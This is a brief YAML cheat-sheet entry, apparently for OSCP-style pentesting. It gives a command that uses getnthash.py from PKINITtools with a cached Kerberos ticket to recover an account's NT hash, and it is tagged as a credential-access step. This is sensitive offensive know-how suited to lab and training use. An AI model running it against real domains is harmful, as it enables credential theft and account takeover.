---
command: |
  export KRB5CCNAME=out.ccache
  uv run getnthash.py -key $ASREPKEY $DOMAIN/$USER
description: Recover the NT hash of an account from the PKINIT session key returned by gettgtpkinit
os: [Linux]
category: [oscp, cli]
have: [ticket]
service: [Kerberos]
phase: [CredAccess]
references:
  - https://github.com/dirkjanm/PKINITtools
---
